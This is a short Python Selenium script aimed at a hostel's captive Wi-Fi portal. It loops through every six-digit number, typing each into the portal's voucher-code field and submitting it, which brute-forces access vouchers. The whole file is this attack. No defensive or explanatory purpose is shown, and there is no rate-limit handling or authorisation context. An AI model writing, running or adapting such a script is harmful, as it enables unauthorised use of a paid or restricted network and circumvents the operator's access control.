from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time

driver = webdriver.Firefox()
driver.get(r"http://192.168.1.100:8088/portal/entry?cid=AC:B5:7D:BF:A5:2C&ap=98:DA:C4:65:29:DF&ssid=Hostel%20WiFi%20Hub&t=1614777926&rid=0&u=www.msftconnecttest.com%2Fredirect")
time.sleep(5)

for x in range(100000, 999999):
    voucher = driver.find_element_by_id("voucherCode")
    hint = driver.find_element_by_id("hint-area")
    voucher.clear()
    print(x)
    voucher.send_keys(str(x))
    voucher.send_keys(Keys.RETURN)
